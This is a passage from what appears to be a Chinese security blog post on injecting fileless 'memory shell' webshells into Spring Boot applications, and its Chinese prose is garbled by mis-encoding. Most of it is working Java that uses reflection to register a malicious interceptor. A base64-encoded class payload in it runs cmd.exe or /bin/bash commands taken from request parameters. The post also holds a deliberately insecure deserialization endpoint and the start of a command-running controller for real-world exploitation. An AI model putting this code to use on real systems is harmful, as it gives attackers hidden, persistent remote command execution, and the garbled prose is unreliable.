class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>()).addPathPatterns(<span class="hljs-string">&quot;/hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113202533221.png" alt="image-20241113202533221"></p><h2 id="interceptoræµç¨‹"><a href="#Interceptoræµç¨‹" class="headerlink" title="Interceptoræµç¨‹"></a>Interceptoræµç¨‹</h2><p>emmmæˆ‘æœ¬èº«æ‰“ç®—é…ç½®ç±»å¤„æ‰“ä¸ªæ–­ç‚¹åˆ†æinterceptorçš„æ³¨å†Œæµç¨‹ï¼Œä½†æ˜¯çœ‹æ–‡ç« éƒ½æ˜¯ä»å¤„ç†è¯·æ±‚çš„æµç¨‹æ¥åˆ†æçš„ï¼Œä¼°è®¡æ˜¯å¦‚æœè¦åŠ¨æ€æ³¨å†Œçš„è¯æˆ‘ä»¬åº”è¯¥æ˜¯èµ°ä¸åˆ°é…ç½®ç±»çš„æ‰‹åŠ¨addInterceptorçš„åœ°æ–¹å—ğŸ¤”</p><p>å…ˆæŒ‰ç€ç½‘ä¸Šçš„æ€è·¯æ¥å§ï¼Œè¿™ä¸ªç‚¹åˆ°æ—¶æœ‰ç©ºçš„è¯ç ”ç©¶ä¸€ä¸‹ğŸ«¡</p><p>é‚£å°±ç›´æ¥åœ¨preHandleä¸‹ä¸ªæ–­ç‚¹</p><p><img src="https://cdn.clown2024.cn/image-20241113213033793.png" alt="image-20241113213033793"></p><p>ç„¶åçœ‹çœ‹è°ƒç”¨æ ˆï¼Œå…¶ä¸­åœ¨DispatcherServlet#doDispatchæ–¹æ³•é‡Œé¢çœ‹åˆ°äº†å¤„ç†æˆ‘ä»¬PreHandleæ–¹æ³•çš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241113213305476.png" alt="image-20241113213305476"></p><p>è¿™ä¸ªapplyPreHandleæ–¹æ³•å¾ˆæ˜æ˜¾å°±æ˜¯å¤„ç†æˆ‘ä»¬PreHandleçš„æ–¹æ³•ï¼Œä»è¿”å›å€¼ä¹Ÿå¯ä»¥æ¨å‡ºï¼Œå› ä¸ºæˆ‘ä»¬PreHandleè¿”å›çš„ä¹Ÿæ˜¯å¸ƒå°”å€¼</p><p>ä»å›¾ä¸­çš„å˜é‡å€¼å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„interceptorå°±åœ¨è¿™ä¸ªmappedHandlerå˜é‡å½“ä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241113213755407.png" alt="image-20241113213755407"></p><p>é‚£å°±çœ‹çœ‹è¿™ä¸ªmappedHandleræ˜¯æ€ä¹ˆç”Ÿæˆçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113213924826.png" alt="image-20241113213924826"></p><p>åœ¨doDispatchæ–¹æ³•å‰é¢æœ‰ä¸€ä¸ªgetHandleræ–¹æ³•ï¼Œç„¶åä¼ å…¥ä¸€ä¸ªRequestFacadeå®ä¾‹processedRequestï¼Œè¿™ä¸ªprocessedRequestæ˜¯å‰é¢checkMultipartæ–¹æ³•æ£€æŸ¥ä¸€ä¸‹ï¼Œè¯¥æ–¹æ³•ä¸»è¦åˆ¤æ–­requestæ˜¯å¦ä¸ºæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œä¸æ˜¯çš„è¯åˆ™ä¼šåŸæ ·è¿”å›</p><p>è·Ÿè¿›å»getHandler</p><p><img src="https://cdn.clown2024.cn/image-20241113214501797.png" alt="image-20241113214501797"></p><p>ç„¶åå°±æ˜¯éå†æ¯ä¸€ä¸ªHandlerMappingï¼Œç„¶åä»ä¸­å–å¾—HandlerExecutionChainå®ä¾‹ï¼Œå¦‚æœèƒ½æ‰¾åˆ°è¯·æ±‚å¯¹åº”çš„Handlerå°±è¿”å›ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè°ƒç”¨äº†AbstractHandlerMapping#getHandleræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113215756803.png" alt="image-20241113215756803"></p><p>è¿™é‡Œé¦–å…ˆè·å¾—ä¸€ä¸ªhandlerï¼Œç„¶åè°ƒç”¨getHandlerExecutionChainè¿”å›äº†ä¸€ä¸ªHandlerExecutionChainå®ä¾‹executionChainï¼Œçœ‹çœ‹è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113215627045.png" alt="image-20241113215627045"></p><p>é‡Œé¢æ˜¾ç¤ºnewäº†ä¸€ä¸ªHandlerExecutionChainï¼Œç„¶åéå†adaptedInterceptorsé‡Œçš„interceptoræ·»åŠ è¿›å»ä»–çš„interceptorListé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241113215958004.png" alt="image-20241113215958004"></p><p>interceptoræœ‰å¦‚ä¸‹çš„è¿™ä¸‰ç§</p><p><img src="https://cdn.clown2024.cn/image-20241113220049185.png" alt="image-20241113220049185"></p><p>å†å¾€ä¸‹ä»–å°±ç›´æ¥è¿”å›äº†è¿™ä¸ªexecutionChain</p><p><img src="https://cdn.clown2024.cn/image-20241113220218053.png" alt="image-20241113220218053"></p><p>ç„¶åè¿”å›çš„handlerä¹Ÿæ˜¯è¿™ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241113220259687.png" alt="image-20241113220259687"></p><p>ç„¶åæœ€ç»ˆæ‰§è¡Œå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„é‚£ä¸ªapplyPreHandleæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113220624107.png" alt="image-20241113220624107"></p><p>é‡Œé¢éå†äº†æ¯ä¸ªinterprectorç„¶åè¿›è¡Œè°ƒç”¨</p><p>é‚£ç°åœ¨æˆ‘ä»¬å°±çŸ¥é“åº”è¯¥åœ¨å“ªé‡Œæ’å…¥æˆ‘ä»¬çš„interceptoräº†</p><h2 id="å†…å­˜é©¬å®ç°"><a href="#å†…å­˜é©¬å®ç°-1" class="headerlink" title="å†…å­˜é©¬å®ç°"></a>å†…å­˜é©¬å®ç°</h2><p>æ ¹æ®å‰é¢çš„åˆ†ææ‰€æœ‰çš„interceptoræ˜¯å­˜åœ¨adaptedInterceptorsé‡Œé¢ï¼Œè¿™ä¸ªå±æ€§åœ¨org.springframework.web.servlet.handler.AbstractHandlerMappingé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241113221751279.png" alt="image-20241113221751279"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯åå°„è·å–åˆ°è¿™ä¸ªå˜é‡ï¼Œç„¶åæ·»åŠ æˆ‘ä»¬è‡ªå·±çš„æ¶æ„interceptorå³å¯</p><p>ç¼–å†™çš„interceptorè¿˜æ˜¯ç”¨æˆ‘ä»¬ä¸€å¼€å§‹çš„é‚£ä¸ªTestInterceptorï¼Œç°åœ¨å…ˆä¸æŠŠä»–åŠ å…¥é…ç½®ï¼Œæˆ‘ä»¬ç­‰ä¼šæ‰‹åŠ¨åŠ å…¥</p><p>ç„¶åç¼–å†™å†…å­˜é©¬ä»£ç çš„æ­¥éª¤</p><ul><li>é¦–å…ˆè·å–åº”ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯<code>ApplicationContext</code></li><li>ç„¶åä» <code>ApplicationContext</code> ä¸­è·å– <code>AbstractHandlerMapping</code> å®ä¾‹ï¼ˆç”¨äºåå°„ï¼‰ï¼Œä¹Ÿæœ‰æ–‡ç« ç›´æ¥è·å–RequestMappingHandlerMappingä¹Ÿå¯ä»¥ï¼Œä¸‹é¢å†™çš„å°±æ˜¯ç”¨çš„è¿™ä¸ª</li><li>åå°„è·å– <code>AbstractHandlerMapping</code>ç±»çš„ <code>adaptedInterceptors</code>å­—æ®µ</li><li>é€šè¿‡ <code>adaptedInterceptors</code>æ³¨å†Œæ‹¦æˆªå™¨</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">TestInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>();<br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¿é—®interceptorè¿™ä¸ªè·¯ç”±å°±ä¼šæˆåŠŸæ³¨å†Œæˆ‘ä»¬çš„interceptor</p><p><img src="https://cdn.clown2024.cn/image-20241113224259546.png" alt="image-20241113224259546"></p><p><img src="https://cdn.clown2024.cn/image-20241113224312450.png" alt="image-20241113224312450"></p><p>è¿™é‡Œçš„å®ç°ä¹Ÿå¯ä»¥æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆå‰é¢Controllerçš„base64çš„å½¢å¼ï¼Œè¿™æ ·å°±ä¸éœ€è¦æœåŠ¡å™¨æœ‰å¯¹åº”çš„ç±»äº†</p><p>ä¿®æ”¹åçš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + evilInterceptor);<br><span class="hljs-comment">//        TestInterceptor evilInterceptor = new TestInterceptor();</span><br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬"><a href="#å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬" class="headerlink" title="å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬"></a>å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬</h1><p>å‰é¢çš„å†™æ³•è¿˜ä¸èƒ½æ»¡è¶³å®æˆ˜åˆ©ç”¨ï¼Œå®æˆ˜ä¸­é€šå¸¸ç»“åˆååºåˆ—åŒ–çš„å½¢å¼ï¼Œä¸è¿‡æ”¹æˆå®æˆ˜åˆ©ç”¨ä¹Ÿè›®ç®€å•çš„ï¼Œå°±æ˜¯ç»“åˆé“¾å­æ¯”å¦‚TemplatesImplé‡Œçš„æ¶æ„ç±»ä»£ç å°±æ˜¯æˆ‘ä»¬å‰é¢æ‰€å†™çš„çš„æ¶æ„ä»£ç </p><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–æ¼æ´çš„è·¯ç”±</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/des&quot;&#125;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;base64Data&quot;)</span> String base64Data)</span> &#123;<br>        System.out.println(base64Data);<br>        <span class="hljs-type">byte</span>[] serializedData = Base64.getMimeDecoder().decode(base64Data);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> deserializeData(serializedData);<br>        <span class="hljs-keyword">return</span> option;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">deserializeData</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serializedData)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>            ois.readObject();<br>            ois.close();<br>            bis.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–åˆ©ç”¨controller"><a href="#ååºåˆ—åŒ–åˆ©ç”¨Controller" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨Controller"></a>ååºåˆ—åŒ–åˆ©ç”¨Controller</h2><p>æˆ‘ä»¬è¦æ³¨å†Œçš„controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder 